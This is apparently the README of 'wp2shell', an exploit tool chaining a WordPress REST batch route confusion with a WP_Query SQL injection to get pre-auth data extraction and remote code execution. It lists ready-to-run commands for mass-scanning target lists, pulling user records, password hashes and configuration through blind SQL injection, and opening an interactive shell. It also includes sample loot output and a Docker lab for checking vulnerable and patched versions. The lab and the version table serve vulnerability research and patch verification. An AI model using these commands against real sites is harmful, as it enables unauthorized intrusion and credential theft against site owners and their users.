# wp2shell — CVE-2026-63030 + CVE-2026-60137

WordPress Pre-Auth RCE via REST Batch Route Confusion + WP_Query SQL Injection.

**Author:** dinhvaren | **Research:** Adam Kues / Searchlight Cyber

## Affected Versions

| Branch | Affected | Fixed |
|--------|----------|-------|
| 6.8.x | 6.8.0 – 6.8.5 | **6.8.6** |
| 6.9.x | 6.9.0 – 6.9.4 | **6.9.5** |
| 7.0.x | 7.0.0 – 7.0.1 | **7.0.2** |

---

## Tool: `poc/wp2shell.py`

### Commands

```bash
# Single target scan
python3 wp2shell.py -t <url> scan
python3 wp2shell.py -t <url> scan -o report.json
python3 wp2shell.py -t <url> scan --sleep 5 --rounds 5
python3 wp2shell.py -t <url> -d scan                    # debug mode

# Bulk scan from file (one URL per line)
python3 wp2shell.py -l targets.txt scan
python3 wp2shell.py -l targets.txt scan -o report.csv
python3 wp2shell.py -l targets.txt scan --sleep 2 --rounds 2

# Read — extract data via pre-auth blind SQLi
python3 wp2shell.py -t <url> read --preset fingerprint
python3 wp2shell.py -t <url> read --preset users
python3 wp2shell.py -t <url> read --preset config
python3 wp2shell.py -t <url> read --query "SELECT VERSION()"
python3 wp2shell.py -t <url> read --preset users -o users.csv

# Shell — post-auth RCE (requires admin credentials)
python3 wp2shell.py -t <url> shell -u admin -p <password> -c id
python3 wp2shell.py -t <url> shell -u admin -p <password>              # interactive
```

### Flags

| Flag | Description |
|------|-------------|
| `-t, --target` | Single WordPress URL |
| `-l, --list` | File with list of URLs to scan (one per line) |
| `-o, --output` | Export results (`.json` / `.csv`) |
| `-d, --debug` | Show raw HTTP requests & responses |
| `--sleep` | SLEEP seconds for SQLi timing (default: 3) |
| `--rounds` | Timing rounds for scan (default: 3) |
| `--timeout` | HTTP timeout seconds (default: 30) |
| `--proxy` | HTTP proxy |
| `--ua` | Custom User-Agent |

### Scan Behavior

| Version | Action |
|---------|--------|
| 6.8.0–6.8.5, 6.9.0–6.9.4, 7.0.0–7.0.1 | Full scan (version + confusion + SQLi) |
| Other WP ≥ 5.6 | Version check → skip (not affected) |
| WP < 5.6 | Skip (no batch API) |
| Not WordPress | Skip (batch unavailable) |

### Scan Output (vulnerable)

```
[*] WordPress 7.0.1 detected via HTML meta generator
[-] VERSION IN AFFECTED RANGE
[+] Route confusion CONFIRMED (parse_path_failed, block_cannot_read, rest_batch_not_allowed)
[+] BLIND SQL INJECTION CONFIRMED (delta=2.0s)

[!!!] VULNERABLE — wp2shell chain confirmed
```

### Read Output (pre-auth data extraction)

```
[+] db_version: 8.0.46
[+] db_user: wordpress@%
[+] db_name: wordpress
[+] hostname: mysql-vulnerable

[+] [1] admin
    Email : admin@localhost.local
    Hash  : $wp$2y$10$Y3mTlnQb4oziMW8S5wkD/e5lqBnR0rs9DhdKT9D0ZYQ3OMuBVwQ/y
    Roles : administrator
```

---

## Docker Lab

Local lab to **verify the exploit and test the tool** before scanning real targets.

### Purpose

- **Vulnerable** instance (7.0.1) — confirms the tool detects correctly
- **Fixed** instance (7.0.2) — confirms the tool reports SAFE
- Side-by-side demo: same tool, same request → old version vulnerable, new version not

### Endpoints

| Instance | URL | Version |
|----------|-----|---------|
| Vulnerable | http://127.0.0.1:8081 | WordPress 7.0.1 |
| Fixed | http://127.0.0.1:8082 | WordPress 7.0.2 |

### Quick Start

```powershell
cd lab

# Build & start
docker compose up -d

# Install WordPress on both
docker exec wp2shell-vulnerable wp --allow-root core install --url="http://127.0.0.1:8081" --title="wp2shell Vuln 7.0.1" --admin_user=admin --admin_password="wp2shell-local-lab" --admin_email=a@a.a --skip-email

docker exec wp2shell-fixed wp --allow-root core install --url="http://127.0.0.1:8082" --title="wp2shell Fixed 7.0.2" --admin_user=admin --admin_password="wp2shell-local-lab" --admin_email=a@a.a --skip-email

# Add .htaccess (see lab/README.md for full setup)

# Verify
cd ../poc
python3 wp2shell.py -t http://127.0.0.1:8081 scan    # → VULNERABLE
python3 wp2shell.py -t http://127.0.0.1:8082 scan    # → SAFE
```

### Management

```powershell
docker compose stop       # Stop (keep data)
docker compose start      # Start again
docker compose down -v    # Full reset
```

### Credentials (local lab only)

```
Admin  : admin / wp2shell-local-lab
MySQL  : root / wp2shell_root_local_only
```

---

## Project Structure

```
wp2shell/
├── README.md              ← This file
├── analysis/
│   ├── root-cause.md      ← Root cause + vulnerable vs fixed code
│   ├── chain.md           ← Attack chain step-by-step
│   ├── diff.md            ← Patch diff 7.0.1 → 7.0.2
│   └── poc.md             ← Tool internals
├── lab/
│   ├── README.md          ← Full lab setup guide
│   ├── docker-compose.yml
│   └── Dockerfile
└── poc/
    └── wp2shell.py        ← Main tool
```
